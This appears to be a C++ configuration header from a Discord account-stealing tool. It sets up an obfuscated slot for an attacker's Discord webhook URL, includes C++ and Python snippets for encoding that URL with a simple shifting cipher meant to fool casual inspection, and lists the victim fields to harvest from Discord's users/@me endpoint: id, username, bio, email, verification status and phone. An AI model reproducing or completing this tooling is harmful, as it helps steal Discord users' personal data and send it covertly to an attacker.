#pragma once
#include <array>
#include <string_view>

namespace hentai
{
	template <std ::size_t N>
	static constexpr std::string uwu(std::array<unsigned char, N> burp) noexcept;
	/*
	You can use this function to encode your discord
	std::vector woow(std::string burp);
	{
		std::vector<char> boobs;
		for (unsigned int i = 0; i < burp.size(); ++i)
		{
			if (i % 2 == 0)
				boobs.push_back(burp.at(i) + 3);
			else
				boobs.push_back(burp.at(i) - 3);

		}
	
		boobs.push_back('\0');
		return boobs;
	}
	Or for py lovers
	woow = []
	for i, data in enumerate("Your Webhook"):
		if i % 2 == 0:
			woow.append(ord(data) + 3)
		else:
			woow.append(ord(data) - 3)
	print(woow)
	print(len(woow))
	*/
}

namespace config
{
	// Discord Webhook URL
	// Use the above function to encode your web hook url
	// I know its pretty basic cipher but works against noobs
	// Enter your encoded bytes here
	constexpr std ::array<unsigned char, 0> encoded_webhook{};

	// Data to be extracted from https://discord.com/api/v9/users/@me
	constexpr std::array<std ::string_view, 6> useful_data{"id", "username", "bio", "email", "verified", "phone"};

}

template <std::size_t N>
static constexpr std::string hentai::uwu(std::array<unsigned char, N> burp) noexcept
{
	std::string WooW = "";
	for (std::size_t i = 0; i < burp.size(); ++i)
	{
		if (i % 2 == 0)
			WooW.push_back(burp.at(i) - 3);
		else
			WooW.push_back(burp.at(i) + 3);
	}
	return WooW;
}